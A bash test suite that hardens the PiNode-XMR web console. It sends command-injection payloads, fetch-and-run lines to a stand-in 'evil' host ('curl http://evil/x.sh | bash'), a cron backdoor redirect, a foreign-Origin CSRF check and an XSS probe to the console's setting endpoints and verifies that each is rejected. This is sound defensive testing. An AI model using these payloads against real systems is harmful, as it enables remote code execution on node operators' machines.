#!/bin/bash
#
# security-test.sh - Verification suite for the PiNode-XMR web console hardening.
#
# Exercises every value-setter endpoint over real HTTP with both legitimate
# values and injection payloads, then confirms the generated shell fragments
# are safe to source.
#
# Usage:
#   ./tests/security-test.sh [base_url]
#
# Default base_url is http://127.0.0.1:8080 (a `php -S` dev server).
# On a live PiNode run:  ./tests/security-test.sh http://127.0.0.1
#
# Exit status 0 = all checks passed.

BASE="${1:-http://127.0.0.1:8080}"
VARS="${PINODE_VARS:-/home/pinodexmr/variables}"
EXEC="${PINODE_EXEC:-/home/pinodexmr/execScripts}"

PASS=0; FAIL=0
ok()   { PASS=$((PASS+1)); printf '  \033[32mPASS\033[0m %s\n' "$1"; }
bad()  { FAIL=$((FAIL+1)); printf '  \033[31mFAIL\033[0m %s\n' "$1"; }
head() { printf '\n\033[1m== %s ==\033[0m\n' "$1"; }

CSRF=(-H "X-PiNode-CSRF: 1")

# The console requires authentication by default. Supply credentials with
# PINODE_USER / PINODE_PASS, or let the suite read the generated pair that
# enable-web-auth.sh leaves in /root/pinode-web-credentials.
CREDS_FILE=/root/pinode-web-credentials
PINODE_USER="${PINODE_USER:-}"
PINODE_PASS="${PINODE_PASS:-}"
if [ -z "$PINODE_PASS" ] && [ -r "$CREDS_FILE" ]; then
  PINODE_USER="${PINODE_USER:-$(awk '/^username:/{print $2}' "$CREDS_FILE")}"
  PINODE_PASS="$(awk '/^password:/{print $2}' "$CREDS_FILE")"
fi
AUTH=()
[ -n "$PINODE_PASS" ] && AUTH=(-u "${PINODE_USER:-pinodexmr}:$PINODE_PASS")

post() { curl -s -o /tmp/_body -w '%{http_code}' "${AUTH[@]+"${AUTH[@]}"}" "${CSRF[@]}" -X POST "$BASE/$1" --data-urlencode "value=$2"; }

# accept <endpoint> <value> <file> <var> -- a valid value is stored correctly
accept() {
  local ep="$1" val="$2" file="$3" var="$4"
  local code; code=$(post "$ep" "$val")
  if [ "$code" != "200" ]; then bad "$ep accepts '$val' (got HTTP $code: $(cat /tmp/_body))"; return; fi
  if [ -n "$file" ]; then
    # the fragment must source cleanly and yield exactly the submitted value
    local got; got=$(bash -c ". '$file' 2>/dev/null; printf '%s' \"\$$var\"")
    if [ "$got" = "$val" ]; then ok "$ep stores '$val' -> \$$var sources correctly"
    else bad "$ep stored '$got', expected '$val'"; fi
  else ok "$ep accepts '$val'"; fi
}

# reject <endpoint> <payload> <label> -- a malicious value is refused, nothing written
reject() {
  local ep="$1" val="$2" label="$3" file="$4"
  local before=""; [ -n "$file" ] && before=$(cat "$file" 2>/dev/null)
  local code; code=$(post "$ep" "$val")
  local after="";  [ -n "$file" ] && after=$(cat "$file" 2>/dev/null)
  if [ "$code" = "400" ] && [ "$before" = "$after" ]; then
    ok "$ep rejects $label (HTTP 400, file unchanged)"
  elif [ "$code" != "400" ]; then bad "$ep ACCEPTED $label (HTTP $code)"
  else bad "$ep rejected $label but MODIFIED the file"; fi
}

# Payloads that must never be accepted anywhere.
INJ_NL=$'1\ntouch /tmp/pinode_pwned'
INJ_SEMI='1; touch /tmp/pinode_pwned'
INJ_SUB='1$(touch /tmp/pinode_pwned)'
INJ_BT='1`touch /tmp/pinode_pwned`'
INJ_PIPE='1|touch /tmp/pinode_pwned'
INJ_AMP='1 && touch /tmp/pinode_pwned'

rm -f /tmp/pinode_pwned

# Preflight: fail loudly if the console is not reachable, rather than
# reporting every check as a failure.
if [ "$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 "$BASE/runScript.php" 2>/dev/null)" = "000" ]; then
  printf '\033[31mCannot reach the PiNode web console at %s\033[0m\n' "$BASE" >&2
  printf 'Start it (or point this script at the node) before running the suite.\n' >&2
  exit 2
fi

head "Numeric endpoints (ports, peers, rates, threads, intensity)"
accept monero-rpc-port.php          18081 "$VARS/monero-port.sh"             MONERO_PORT
accept monero-port-public-free.php  18089 "$VARS/monero-port-public-free.sh" MONERO_PUBLIC_PORT
accept monero_public_port.php       18081 "$VARS/monero-public-port.sh"      MONERO_PUBLIC_PORT
accept i2p-port.php                 30888 "$VARS/i2p-port.sh"                I2P_PORT
accept i2p-tx-proxy-port.php        4447  "$VARS/i2p-tx-proxy-port.sh"       I2P_TX_PROXY_PORT
accept in-peers.php                 12    "$VARS/in-peers.sh"                IN_PEERS
accept out-peers.php                12    "$VARS/out-peers.sh"               OUT_PEERS
accept in-peers-p2pool.php          -1    "$VARS/in-peers-p2pool.sh"         IN_PEERS_P2POOL
accept out-peers-p2pool.php         -1    "$VARS/out-peers-p2pool.sh"        OUT_PEERS_P2POOL
accept speed_up.php                 1024  "$VARS/limit-rate-up.sh"           LIMIT_RATE_UP
accept speed_down.php               2048  "$VARS/limit-rate-down.sh"         LIMIT_RATE_DOWN
accept mining-threads.php           4     "$VARS/mining-threads.sh"          MINING_THREADS
accept mining-intensity.php         75    "$VARS/mining-intensity.sh"        MINING_INTENSITY

head "Numeric endpoints reject injection + out-of-range"
for p in "$INJ_NL:newline-injection" "$INJ_SEMI:semicolon-chain" "$INJ_SUB:command-substitution" \
         "$INJ_BT:backtick-substitution" "$INJ_PIPE:pipe-chain" "$INJ_AMP:and-chain"; do
  reject monero-rpc-port.php "${p%%:*}" "${p##*:}" "$VARS/monero-port.sh"
done
reject monero-rpc-port.php 0       "port 0"            "$VARS/monero-port.sh"
reject monero-rpc-port.php 65536   "port 65536"        "$VARS/monero-port.sh"
reject monero-rpc-port.php ""      "empty value"       "$VARS/monero-port.sh"
reject mining-intensity.php 101    "intensity > 100"   "$VARS/mining-intensity.sh"
reject mining-threads.php  0       "0 threads"         "$VARS/mining-threads.sh"
reject in-peers.php        abc     "non-numeric"       "$VARS/in-peers.sh"

head "Mining address (reward-theft vector)"
GOOD_ADDR=44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A
accept mining-address.php "$GOOD_ADDR" "$VARS/mining-address.sh" MINING_ADDRESS
reject mining-address.php "$INJ_NL"  "newline-injection"        "$VARS/mining-address.sh"
reject mining-address.php "$INJ_SEMI" "semicolon-chain"         "$VARS/mining-address.sh"
reject mining-address.php "44tooshort" "short address"          "$VARS/mining-address.sh"
reject mining-address.php "${GOOD_ADDR}0OIl" "invalid base58"   "$VARS/mining-address.sh"
reject mining-address.php "9${GOOD_ADDR:1}" "bad prefix"        "$VARS/mining-address.sh"

head "I2P address"
accept i2p-address.php "ukeu3k5oycgaauneqgtnvselmt4yemvoilkln7jpvamvfx7dnkdq.b32.i2p" "$VARS/i2p-address.sh" I2P_ADDRESS
reject i2p-address.php "$INJ_SUB"  "command-substitution" "$VARS/i2p-address.sh"
reject i2p-address.php "$INJ_SEMI" "semicolon-chain"      "$VARS/i2p-address.sh"
reject i2p-address.php "a b.i2p"   "whitespace"           "$VARS/i2p-address.sh"

head "Ethereum JSON-RPC endpoint"
accept ethJsonRpc.php "https://eth.example.com:8545" "$VARS/eth-rpc-node.sh" ETH_RPC_NODE
reject ethJsonRpc.php "$INJ_BT"                "backtick"       "$VARS/eth-rpc-node.sh"
reject ethJsonRpc.php "$INJ_SEMI"              "semicolon"      "$VARS/eth-rpc-node.sh"
reject ethJsonRpc.php "file:///etc/passwd"     "non-http scheme" "$VARS/eth-rpc-node.sh"
reject ethJsonRpc.php 'http://a b'             "whitespace"     "$VARS/eth-rpc-node.sh"

head "P2Pool sidechain selector (whitelist)"
accept p2poolChain.php "--mini" "$VARS/p2poolChain.sh" P2POOLCHAIN
accept p2poolChain.php "--nano" "$VARS/p2poolChain.sh" P2POOLCHAIN
code=$(post p2poolChain.php '--mini; touch /tmp/pinode_pwned')
val=$(bash -c ". '$VARS/p2poolChain.sh' 2>/dev/null; printf '%s' \"\$P2POOLCHAIN\"")
if [ "$val" = "" ]; then ok "p2poolChain.php maps unknown value to safe empty (main chain)"
else bad "p2poolChain.php stored unexpected '$val'"; fi

head "Custom monerod command (RCE vector)"
accept save-custom.php "./monerod --rpc-bind-port=18081 --out-peers=12 --detach" "" ""
CUSTOM="$EXEC/moneroCustomNode.sh"
reject save-custom.php './monerod --detach; touch /tmp/pinode_pwned' "semicolon-chain"      "$CUSTOM"
reject save-custom.php './monerod && curl evil|bash'                "and/pipe chain"        "$CUSTOM"
reject save-custom.php './monerod $(touch /tmp/pinode_pwned)'       "command-substitution"  "$CUSTOM"
reject save-custom.php './monerod `touch /tmp/pinode_pwned`'        "backtick"              "$CUSTOM"
reject save-custom.php 'curl -s http://evil/x.sh | bash'            "non-monerod command"   "$CUSTOM"
reject save-custom.php '/bin/bash -c "id"'                          "shell invocation"      "$CUSTOM"
reject save-custom.php './monerod > /etc/cron.d/backdoor'           "output redirection"    "$CUSTOM"
reject save-custom.php $'./monerod\ntouch /tmp/pinode_pwned'        "newline-injection"     "$CUSTOM"

head "Request-method enforcement (state change requires POST)"
for ep in mining-address.php monero-rpc-port.php save-custom.php in-peers.php runScript.php; do
  code=$(curl -s -o /dev/null -w '%{http_code}' "${AUTH[@]+"${AUTH[@]}"}" "${CSRF[@]}" "$BASE/$ep?value=1")
  [ "$code" = "400" ] && ok "$ep refuses GET" || bad "$ep answered GET with HTTP $code"
done

head "CSRF protection"
# A cross-site attacker can submit a form POST, but cannot set a custom header.
for ep in mining-address.php monero-rpc-port.php save-custom.php runScript.php monerod-prune.php; do
  code=$(curl -s -o /dev/null -w '%{http_code}' "${AUTH[@]+"${AUTH[@]}"}" -X POST "$BASE/$ep" --data-urlencode 'value=18081' --data-urlencode 'function=reboot')
  [ "$code" = "400" ] && ok "$ep refuses POST without the CSRF header" \
    || bad "$ep accepted a header-less POST (HTTP $code) - forgeable cross-site"
done
# A foreign Origin must be refused even if the header is somehow present.
for ep in mining-address.php runScript.php; do
  code=$(curl -s -o /dev/null -w '%{http_code}' "${AUTH[@]+"${AUTH[@]}"}" "${CSRF[@]}" -H "Origin: http://evil.example" \
    -X POST "$BASE/$ep" --data-urlencode 'value=18081' --data-urlencode 'function=reboot')
  [ "$code" = "400" ] && ok "$ep refuses a foreign Origin" || bad "$ep accepted Origin http://evil.example (HTTP $code)"
done
# The console's own Origin must still work.
HOSTHDR=$(printf '%s' "$BASE" | sed 's#^https\?://##')
code=$(curl -s -o /dev/null -w '%{http_code}' "${AUTH[@]+"${AUTH[@]}"}" "${CSRF[@]}" -H "Origin: $BASE" \
  -X POST "$BASE/monero-rpc-port.php" --data-urlencode 'value=18081')
[ "$code" = "200" ] && ok "same-origin request with header still succeeds" \
  || bad "same-origin request was refused (HTTP $code) - console would be broken"
# The service-control endpoint must still work for the console itself.
code=$(curl -s -o /dev/null -w '%{http_code}' "${AUTH[@]+"${AUTH[@]}"}" "${CSRF[@]}" -X POST "$BASE/runScript.php" --data-urlencode 'function=nosuchfunction')
[ "$code" = "400" ] && ok "runScript.php reachable with header (unknown selector -> 400)" \
  || bad "runScript.php with header returned HTTP $code"

head "Authentication boundary"
if [ -n "$PINODE_PASS" ]; then
  for u in nodeControl.html mining-address.php runScript.php debug.log; do
    c=$(curl -s -o /dev/null -w '%{http_code}' "$BASE/$u")
    { [ "$c" = "401" ] || [ "$c" = "403" ]; } && ok "$u refused without credentials (HTTP $c)" \
      || bad "$u served unauthenticated (HTTP $c)"
  done
  c=$(curl -s -o /dev/null -w '%{http_code}' "${AUTH[@]}" "$BASE/nodeControl.html")
  [ "$c" = "200" ] && ok "console reachable with credentials" || bad "console refused valid credentials (HTTP $c)"
  c=$(curl -s -o /dev/null -w '%{http_code}' "${AUTH[@]}" "$BASE/debug.log")
  [ "$c" = "200" ] || [ "$c" = "404" ] && ok "operator can still read debug.log (HTTP $c)" \
    || bad "operator cannot read debug.log (HTTP $c)"
else
  skip_auth=1
  printf '  \033[33mSKIP\033[0m authentication not enabled on this console\n'
fi

head "Reflected-XSS escaping"
code=$(post save-custom.php './monerod --data-dir=/tmp/<script>alert(1)</script>')
if grep -qi '<script>' /tmp/_body; then bad "save-custom.php reflected raw <script>"
else ok "save-custom.php does not reflect raw markup"; fi

head "Generated fragments are safe to source"
# Only the fragments the web console writes are in scope here. Others (e.g.
# deviceIp.sh) are produced by the setup scripts and legitimately use command
# substitution.
WEB_WRITTEN="eth-rpc-node i2p-address i2p-port i2p-tx-proxy-port in-peers-p2pool in-peers \
limit-rate-down limit-rate-up mining-address mining-intensity mining-threads \
monero-port-public-free monero-port monero-public-port out-peers-p2pool out-peers p2poolChain"
BADF=0
for n in $WEB_WRITTEN; do
  f="$VARS/$n.sh"
  [ -e "$f" ] || continue
  if ! grep -qE "^[A-Za-z_][A-Za-z0-9_]*='([^']|'\\\\'')*'$" "$f"; then
    bad "$(basename "$f") assignment is not single-quoted: $(grep -E '^[A-Za-z_]+=' "$f")"; BADF=1
  fi
  bash -n "$f" 2>/dev/null || { bad "$(basename "$f") is not valid bash"; BADF=1; }
done
[ "$BADF" = 0 ] && ok "all console-written fragments are single-quoted and parse as bash"

head "No payload achieved execution"
if [ -f /tmp/pinode_pwned ]; then bad "/tmp/pinode_pwned EXISTS - an injection succeeded"
else ok "/tmp/pinode_pwned absent - no injection executed"; fi

printf '\n\033[1m---------------------------------------\033[0m\n'
printf 'passed: \033[32m%s\033[0m   failed: \033[31m%s\033[0m\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ] && { echo "ALL CHECKS PASSED"; exit 0; } || { echo "FAILURES PRESENT"; exit 1; }
